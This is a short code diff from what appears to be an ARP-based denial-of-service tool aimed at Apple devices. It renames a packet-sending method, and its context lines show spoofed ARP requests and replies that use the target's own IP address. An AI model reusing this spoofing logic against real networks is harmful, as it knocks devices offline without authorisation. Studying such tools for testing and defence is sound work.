@@ -128,7 +128,7 @@ class AppleArpDos:
                                                   sender_ip=self._target['ipv4-address'],
                                                   target_mac='00:00:00:00:00:00',
                                                   target_ip=random_ip_address)
-        self._raw_send.send(packet=arp_init_request, count=count_of_packets, delay=0.5)
+        self._raw_send.send_packet(packet=arp_init_request, count=count_of_packets, delay=0.5)
     # endregion
 
     # region ARP reply sender
@@ -143,7 +143,7 @@ class AppleArpDos:
                                             sender_ip=self._target['ipv4-address'],
                                             target_mac=self._target['mac-address'],
                                             target_ip=self._target['ipv4-address'])
-        self._raw_send.send(packet=arp_reply)
+        self._raw_send.send_packet(packet=arp_reply)
         if not self._quit:
             self._base.print_info('ARP response to: ', self._target['ipv4-address'],
                                   ' "' + self._target['ipv4-address'] +
